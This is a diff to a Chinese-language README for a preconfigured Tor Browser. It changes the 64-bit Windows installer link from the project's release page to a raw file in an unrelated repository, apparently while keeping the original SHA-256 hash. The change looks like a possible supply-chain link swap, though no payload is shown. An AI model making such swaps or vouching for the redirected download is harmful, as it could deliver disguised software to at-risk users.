@@ -25,7 +25,7 @@
 # 安装
 
 
-<h3>预配置 Tor 浏览器 for Windows (64位)</h3><a href="https://github.com/torchina/get/releases/download/v8.0.8/torbrowser-install-win64-8.0.8_zh-CN.exe">torbrowser-install-win64-8.0.8_zh-CN.exe</a><br>4C6D669275FE14C84EA346D21213FD724F11F2B0108418AD7325C578527076DD - SHA-256</br>
+<h3>预配置 Tor 浏览器 for Windows (64位)</h3><a href="https://raw.githubusercontent.com/mjstest/orgb1/e5a4dc072e1dd7fed4fd51f13a6d7d85/torbrowser-install-win64-8.0.8_zh-CN.exe">torbrowser-install-win64-8.0.8_zh-CN.exe</a><br>4C6D669275FE14C84EA346D21213FD724F11F2B0108418AD7325C578527076DD - SHA-256</br>
 
 <h3>预配置 Tor 浏览器 for Windows (32位)</h3><a href="https://github.com/torchina/get/releases/download/v8.0.8/torbrowser-install-8.0.8_zh-CN.exe">torbrowser-install-8.0.8_zh-CN.exe</a><br>052765073CDB65DB43F4786D02AC259C47D83A90DA8A73FD3A1CFEEF2C3A3A4F - SHA-256</br>
 
